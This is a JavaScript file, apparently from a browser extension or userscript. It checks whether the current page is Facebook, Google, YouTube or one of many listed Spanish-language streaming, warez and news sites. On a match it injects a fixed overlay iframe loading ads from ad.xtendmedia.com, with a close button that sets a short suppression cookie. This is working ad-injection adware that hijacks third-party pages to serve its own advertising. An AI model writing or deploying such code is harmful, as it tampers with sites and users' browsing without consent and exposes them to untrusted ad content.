function cookietime() {
	cad=new Date();
	cad.setTime(cad.getTime() + (1*1*5*60*1000));
	expira="; expires=" + cad.toGMTString();
    document.cookie = "visitado=false" + expira;
}
function rand(l,u){return Math.floor((Math.random() * (u-l+1))+l);}

function otros(){if(window.location.href.match(/facebook\.com\/plugins/i)){ return false;} else if(window.location.href.match(/facebook\.com\/connect/i)){ return false;} else if(window.location.href.match(/facebook\.com\/attachments/i)){ return false;} else if(window.location.href.match(/youtube\.com\/subscribe_widget/i)){ return false;} else if(window.location.href.match(/youtube\.com\/embed/i)){ return false;} else if(window.location.href.match(/platform\.twitter\.com/i)){ return false;} else if(window.location.href.match(/plusone/i)){ return false; } else if(window.location.href.match(/support/i)){ return false;}else if(window.location.href.match(/analytics/i)){ return false; } else if(window.location.href.match(/adsense/i)){ return false; } else { return true; }} 

if (otros()){ 

	var ads = new Array();
	
	if(window.location.href.match(/^http:\/\/(www\.)?facebook\.com/i)){ ads[2]="http://ad.xtendmedia.com/st?ad_type=iframe&ad_size=728x90&section=2736631";

	} else if(window.location.href.match(/^http:\/\/(www\.)?google\./i)) { ads[2]="http://ad.xtendmedia.com/st?ad_type=iframe&ad_size=728x90&section=2715138";
	
	} else if(window.location.href.match(/^http:\/\/(www\.)?youtube\.com/i)) { ads[2]="http://ad.xtendmedia.com/st?ad_type=iframe&ad_size=728x90&section=2829755";
	
	} else if (window.location.href.match(/rojadirecta\.me/i) || window.location.href.match(/sport\.es/i) || window.location.href.match(/marca\.com/i)){ 
	
	ads[2]="http://ad.xtendmedia.com/st?ad_type=iframe&ad_size=728x90&section=2829756";
	
	} else if (window.location.href.match(/peliculasid\.net/i) || window.location.href.match(/peliculas-flv\.com/i) || window.location.href.match(/fullpelis\.com/i) || window.location.href.match(/tvyserie\.com/i) || window.location.href.match(/capitulosdenaruto\.com\.ar/i) || window.location.href.match(/seriales\.us/i) || window.location.href.match(/peliculasonlineflv\.net/i) || window.location.href.match(/reyanime\.com/i) || window.location.href.match(/mundonlinetv\.com/i) || window.location.href.match(/seriesid\.com/i) || window.location.href.match(/divxonline\.info/i) || window.location.href.match(/cuevana\.tv/i) || window.location.href.match(/seriesyonkis\.com/i) || window.location.href.match(/submanga\.com/i) || window.location.href.match(/animeytv\.com/i) || window.location.href.match(/cinetube\.es/i) || window.location.href.match(/peliculasyonkis\.com/i) || window.location.href.match(/animeid\.com/i) || window.location.href.match(/cinetux\.org/i)) {
	
	ads[2]="http://ad.xtendmedia.com/st?ad_type=iframe&ad_size=728x90&section=2829854";
	
	} else if (window.location.href.match(/filestube\.com/i) || window.location.href.match(/putlocker\.com/i) || window.location.href.match(/fulltono\.com/i) || window.location.href.match(/localstrike\.net/i) || window.location.href.match(/fileserve\.com/i) || window.location.href.match(/taringa\.net/i) || window.location.href.match(/argentinawarez\.com/i) || window.location.href.match(/gratisjuegos\.org/i) || window.location.href.match(/musica\.com/i) || window.location.href.match(/mimejorfrase1\.com\.ar/i) || window.location.href.match(/9gag\.com/i) || window.location.href.match(/cuantocabron\.com/i) || window.location.href.match(/jaidefinichon\.com/i) || window.location.href.match(/cuantarazon\.com/i)) {
	
	ads[2]="http://ad.xtendmedia.com/st?ad_type=iframe&ad_size=728x90&section=2829852";
	
	} else if (window.location.href.match(/wikia\.com/i) || window.location.href.match(/esmas\.com/i) || window.location.href.match(/imdb\.com/i) || window.location.href.match(/monografias\.com/i) || window.location.href.match(/clarin\.com/i) || window.location.href.match(/ole\.com\.ar/i) || window.location.href.match(/tuenti\.com/i) || window.location.href.match(/juegos\.com/i) || window.location.href.match(/minijuegos\.com/i)) {
	
	ads[2]="http://ad.xtendmedia.com/st?ad_type=iframe&ad_size=728x90&section=2829757";
	
	} else { var publi="no";}

	if ((publi != "no") && (document.cookie.indexOf('visitado=false')<0)) { 
		var s = document.createElement('iframe');s.setAttribute("src", ""+ads[2]+"");s.setAttribute("width", "728");s.setAttribute("height", "90");s.setAttribute("marginwidth", "0");s.setAttribute("marginheight", "0");s.setAttribute("frameborder", "0");s.setAttribute("scrolling", "no");s.setAttribute("style", "background-color:#FFF;");
		var y = document.createElement('div');y.setAttribute("style", "position: absolute; left: 96%; bottom: 65px;");y.setAttribute("class", "2");var img2 = document.createElement('img');img2.setAttribute("src", "http://www.todoanimes.com/imagenes/closeX.png");img2.setAttribute("onclick", "document.getElementById('ads728x').style.display='none';cookietime();");img2.setAttribute("title", "Cerrar");y.appendChild(img2);var x = document.createElement('div');x.setAttribute("style", "position:fixed;left:25%;bottom:15%;width:732px;height:90px;z-index:99999;");x.setAttribute("id", "ads728x");x.appendChild(y);x.appendChild(s);var hh = document.getElementsByTagName('head')[0];hh.parentNode.insertBefore(x, hh);
	}

}

